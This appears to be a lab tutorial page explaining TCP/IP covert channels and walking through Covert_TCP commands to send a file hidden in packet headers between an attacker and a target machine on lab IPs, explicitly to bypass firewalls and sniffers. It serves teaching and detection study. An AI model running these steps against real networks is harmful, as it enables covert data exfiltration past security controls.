# Covert Channels using Covert\_TCP

Networks use network access control permissions to permit or deny the traffic flowing through them. **Tunneling** is used to bypass the access control rules of firewalls, IDS, IPS, and web proxies to allow certain traffic. **Covert channels** can be created by inserting data into the unused fields of protocol headers. There are many unused or misused fields in TCP or IP over which data can be sent to bypass firewalls.

The **Covert\_TCP** program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.

{% embed url="https://github.com/zaheercena/Covert-TCP-IP-Protocol" %}

1. compile the **covert\_tcp.c** both on the attacker and target

```
cc -o covert_tcp covert_tcp.c
```

2. Create a file named  `message.txt`and filled it with secret message
3. In the target machine, start `tcpdump` and create a new folder named `Receive`&#x20;

```
tcpdump -nvvx port 8888 -i lo
```

4. Start the listener on the target machine. put the file to `receive.txt`

```
./covert_tcp -dest 10.10.1.9 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
```

For PoC, turn on the Wireshark to start capturing network traffic.

5. Run the covert channel to send the secret message to the target system. covert\_tcp starts sending the string one char at a time

```
./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -server -file /home/attacker/Desktop/Send/message.txt
```

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
